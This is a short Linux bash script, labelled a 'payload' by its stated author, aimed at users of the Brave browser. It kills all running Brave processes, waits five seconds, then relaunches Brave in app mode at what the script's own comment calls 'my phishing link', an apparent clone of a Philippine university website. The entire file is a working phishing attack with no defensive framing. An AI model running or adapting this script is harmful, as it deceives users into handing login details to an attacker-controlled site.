#!/usr/bin/env bash

################################################
#  This payload only works for brave browser,  #
#  Must be running Linux                       #
#                                              #
#                                              #
#  Author: William Chua                        #   
################################################

# Get process ids
ids=$(ps -C brave -o pid=)


# Kill processes
for specific_id in $ids; do
	kill $specific_id
done


# Sleep for some time
sleep 5s


# Lauch brave-browser to my phishing link
brave-browser --app=https://veenoise.github.io/PUP-website-clone/www.pup.edu.ph/
